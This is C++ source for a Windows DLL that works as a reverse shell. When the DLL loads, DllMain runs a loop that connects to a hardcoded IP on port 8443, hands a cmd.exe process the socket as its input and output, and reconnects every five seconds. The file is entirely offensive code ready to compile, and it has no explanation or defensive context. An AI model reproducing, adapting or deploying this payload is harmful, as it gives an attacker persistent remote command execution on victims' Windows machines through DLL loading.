#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

extern __declspec(dllexport) int Run(void);
int Run(void) {

    char host[] = "192.168.188.154";
    int port = 8443;
    
    while(true) {
        
        // Create socket
        SOCKET socket;
        sockaddr_in addr;
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2,2), &wsaData);
        socket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(host); 
        addr.sin_port = htons(port);    

        // Connect with host
        if (WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(socket);
            WSACleanup();
            continue;
        }
        else {
            char recvData[DEFAULT_BUFLEN];
            memset(recvData, 0, sizeof(recvData));
            int recvCode = recv(socket, recvData, DEFAULT_BUFLEN, 0);
            if (recvCode <= 0) {
                closesocket(socket);
                WSACleanup();
                continue;
            }
            else {
                char proc[] = "cmd.exe";
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                memset(&si, 0, sizeof(si));
                si.cb = sizeof(si);
                si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) socket;
                CreateProcess(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                memset(recvData, 0, sizeof(recvData));
                int recvCode = recv(socket, recvData, DEFAULT_BUFLEN, 0);
                if (recvCode <= 0) {
                    closesocket(socket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(recvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }

        Sleep(5000);    // If connection is closed it will try to reconnect
    }
	return 0;
}


BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {

	switch ( fdwReason ) {
			case DLL_PROCESS_ATTACH:
					Run();
					break;
			case DLL_THREAD_ATTACH:
					break;
			case DLL_THREAD_DETACH:
					break;
			case DLL_PROCESS_DETACH:
					break;
			}
	return TRUE;
}
